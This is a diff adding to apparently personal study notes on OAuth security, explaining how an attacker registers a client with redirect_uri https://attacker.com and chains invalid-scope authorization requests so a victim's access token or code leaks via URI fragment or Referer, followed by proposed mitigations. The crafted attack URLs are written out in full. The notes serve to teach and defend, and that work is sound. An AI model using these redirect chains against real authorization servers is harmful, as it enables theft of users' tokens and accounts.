@@ -1722,7 +1722,62 @@ In order to understand the issue we need to take a closer look at section 4.1.2.
 
 ……
 
-_( icehe : 详见原文, 还不够理解. Note it later. )_
+Let's assume that an attacker does the following :
+
+- Registers a new client to the `https://victim.com` authorization server.
+- Registers a `redirect_uri` such as `https://attacker.com`.
+
+Then the attacker can craft a special URI of the form
+
+```http
+https://victim.com/authorize?response_type=code&client_id=bc88FitX1298KPj2WS259 BBMa9_KCfL3&scope=WRONG_SCOPE&redirect_uri=https://attacker.com
+```
+
+This should redirect back to `https://attacker.com` (without any user interaction, ever), meeting the definition of an open redirector.
+What then?
+**For many attacks, access to an open redirector is only one small part of the attack chain, but it's an essential one.**
+**And what could be better, from the attacker s perspective, than if a trusted OAuth provider gives you one out of the box?**
+
+……
+
+If the authorization server is pattern matching the `redirect_uri` (as seen previously, such as allowing sub-directory) and has an uncompromised public client that shares the same domain as the authorization server, **the attacker can use a redirect error redirection to intercept redirect-based protocol messages via the Referer header and URI fragment**.
+In this scenario the attacker does the following:
+
+1.  Registers a new client to the `https://victim.com` authorization server.
+
+2.  Registers a `redirect_uri` such as `https://attacker.com`.
+
+3.  Creates an invalid authentication request URI for the malicious client.
+
+    As an example he can use a wrong or nonexistent scope (as seen previ- ously):
+
+    ```http
+    https://victim.com/authorize?response_type=code&client_id=bc88FitX1298KPj2WS259BBMa9_KCfL3&scope=WRONG_SCOPE&redirect_ uri=https://attacker.com
+    ```
+
+4.  Crafts a malicious URI targeting the good client that uses the redirect URI to send a request to the malicious client, using the URI in the previous step:
+
+    ```http
+    https://victim.com/authorize?response_type=token&client_id=good-client&scope=VALID_SCOPE&redirect_uri=https%3A%2F%2Fvictim. com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dattacker- client-id%26scope%3DWRONG_SCOPE%26redirect_uri%3Dhttps%3A%2F%2 Fattacker.com
+    ```
+
+5.  If the victim has already used the OAuth client (good-client) and if the authorization server supports TOFU (not prompting the user again),
+    the attacker will receive the response redirected to `https://attacker.com` :
+    the legitimate OAuth Authorization response will include an access token in the URI fragment.
+
+    **Most web browsers will append the fragment to the URI sent in the `location` header of a `30x` response if no fragment is included in the location URI.**
+
+If the authorization request is code instead of a token, the same technique is used, but the code is leaked by the browser in the Referer header rather than the fragment.
+_A draft for an OAuth security addendum<!-- 补遗 --> that should provide better advice to implementers was recently proposed._
+One of the mitigations included in the draft is to **respond with an HTTP 400 (Bad Request) status code rather than to redirect back to the registered `redirect_uri`.**
+
+……
+
+An HTTP 400 (Bad Request) status code is returned instead of the 30x redirect.
+Other proposed mitigations include the following:
+
+- **Perform a redirect to an intermediate URI under the control of the authorization server to clear Referer information in the browser** that may contain security token information.
+- **Append `#` to the error redirect URI** (this **prevents the browser from reattaching the fragment from a previous URI to the new location URI**).
 
 ## 10. Common OAuth token vulnerab ilities
 
